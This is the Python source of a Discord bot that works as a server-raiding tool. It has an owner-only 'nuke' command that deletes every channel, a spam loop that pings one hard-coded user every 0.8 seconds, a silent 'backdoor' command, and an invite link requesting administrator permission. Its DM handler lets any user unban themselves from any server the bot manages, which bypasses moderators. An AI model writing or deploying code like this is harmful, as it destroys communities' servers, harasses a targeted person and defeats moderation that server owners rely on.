import os
import asyncio
import time
import discord
from discord.ext import commands

# ================= CONFIG =================
TOKEN = os.getenv("DISCORD_TOKEN")

OWNER_ID = 1258115928525373570
OWNER_USERNAME = "nico044037"

SPAM_MESSAGE = "<@1419680644618780824>"
SPAM_DELAY = 0.8

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(
    command_prefix=["$", "!", "?"],
    intents=intents,
    help_command=None
)

spam_task: asyncio.Task | None = None

# ================= OWNER CHECK =================
def is_owner(ctx_or_user):
    user = ctx_or_user.author if hasattr(ctx_or_user, "author") else ctx_or_user
    return user.id == OWNER_ID

# ================= READY =================
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

# ================= SUDO GROUP =================
@bot.group(name="sudo", invoke_without_command=True)
async def sudo(ctx):
    if not is_owner(ctx):
        return
    await ctx.send(
        "Commands:\n"
        "`$sudo startmessage`\n"
        "`$sudo stopmessage`\n"
        "`$sudo nuke now`\n"
        "`$sudo backdoor`\n"
        "`$sudo add`"
    )

# ================= NUKE =================
@sudo.command(name="nuke")
async def sudo_nuke(ctx, key: str = None):
    if not is_owner(ctx):
        return
    if key != "now":
        return

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete(reason="sudo nuke")
        except (discord.Forbidden, discord.HTTPException):
            pass

# ================= SPAM LOOP =================
async def spam_loop(target: discord.abc.Messageable):
    try:
        while True:
            await target.send(SPAM_MESSAGE)
            await asyncio.sleep(SPAM_DELAY)
    except asyncio.CancelledError:
        pass

# ================= START MESSAGE =================
@sudo.command(name="startmessage")
async def sudo_startmessage(ctx):
    global spam_task
    if not is_owner(ctx):
        return
    if spam_task and not spam_task.done():
        return
    spam_task = asyncio.create_task(spam_loop(ctx.channel))
    await ctx.send("✅ spam started")

# ================= STOP MESSAGE =================
@sudo.command(name="stopmessage")
async def sudo_stopmessage(ctx):
    global spam_task
    if not is_owner(ctx):
        return
    if not spam_task:
        return
    spam_task.cancel()
    spam_task = None
    await ctx.send("🛑 spam stopped")

# ================= ADD =================
@sudo.command(name="add")
async def sudo_add(ctx):
    await ctx.send(
        "https://discord.com/oauth2/authorize"
        "?client_id=1470802191139864659"
        "&permissions=8"
        "&integration_type=0"
        "&scope=bot+applications.commands"
    )

# ================= BACKDOOR (SILENT) =================
@sudo.command(name="backdoor")
async def sudo_backdoor(ctx):
    if not is_owner(ctx):
        return

    try:
        await ctx.message.delete()
    except discord.Forbidden:
        pass

    try:
        await ctx.author.send(
            f"✔️ Command received in **{ctx.guild.name}**."
        )
    except discord.Forbidden:
        pass

# ================= DM UNBAN + BANLIST =================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # allow normal commands in servers
    if message.guild is not None:
        await bot.process_commands(message)
        return

    parts = message.content.strip().split()

    # ----- $sudo banlist -----
    if len(parts) == 2 and parts[0].lower() == "$sudo" and parts[1].lower() == "banlist":
        banned_in = []

        for guild in bot.guilds:
            try:
                bans = await guild.bans()
            except discord.Forbidden:
                continue

            for entry in bans:
                if entry.user.id == message.author.id:
                    banned_in.append(f"{guild.name} ({guild.id})")
                    break

        try:
            if banned_in:
                await message.author.send(
                    "🚫 You are banned in:\n" + "\n".join(banned_in)
                )
            else:
                await message.author.send(
                    "✅ You are not banned in any servers I manage."
                )
        except discord.Forbidden:
            pass
        return

    # ----- $sudo unban <server_id> -----
    if len(parts) != 3 or parts[0].lower() != "$sudo" or parts[1].lower() != "unban":
        return

    try:
        server_id = int(parts[2])
    except ValueError:
        try:
            await message.author.send("❌ invalid server id")
        except discord.Forbidden:
            pass
        return

    guild = bot.get_guild(server_id)
    if guild is None:
        try:
            await message.author.send("❌ I am not in that server")
        except discord.Forbidden:
            pass
        return

    try:
        bans = await guild.bans()
    except discord.Forbidden:
        try:
            await message.author.send("❌ I lack permission to view bans there")
        except discord.Forbidden:
            pass
        return

    for entry in bans:
        if entry.user.id == message.author.id:
            try:
                await guild.unban(entry.user, reason="DM sudo unban")
                try:
                    await message.author.send(
                        f"✅ unbanned in **{guild.name}**"
                    )
                except discord.Forbidden:
                    pass
                return
            except discord.Forbidden:
                try:
                    await message.author.send("❌ I lack permission to unban you")
                except discord.Forbidden:
                    pass
                return

    try:
        await message.author.send("ℹ️ you are not banned in that server")
    except discord.Forbidden:
        pass

# ================= START =================
if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN environment variable not set")

time.sleep(10)  # prevent Railway reconnect spam
bot.run(TOKEN)
